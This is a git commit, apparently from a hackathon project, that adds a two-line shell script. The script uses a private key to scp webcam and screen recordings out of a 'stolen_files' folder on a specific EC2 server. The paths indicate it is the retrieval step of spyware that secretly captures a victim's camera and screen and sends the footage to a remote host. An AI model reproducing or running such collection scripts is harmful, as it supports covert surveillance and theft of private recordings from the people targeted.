4499b51353b123605349c6249407d1c615c51440
raycastillo2 <74738343+raycastillo2@users.noreply.github.com>
2021-11-07 07:24:24 -0500

    Create Get_Vids.sh

---
+++ Get_Vids.sh
@@ -0,0 +1,2 @@
+sudo scp -i ~/Desktop/KeyHackUMass.pem ec2-user@ec2-18-216-151-152.us-east-2.compute.amazonaws.com:./domino/stolen_files/camrecording.mp4  ~/Desktop
+sudo scp -i ~/Desktop/KeyHackUMass.pem ec2-user@ec2-18-216-151-152.us-east-2.compute.amazonaws.com:./domino/stolen_files/screenrecording.mp4  ~/Desktop
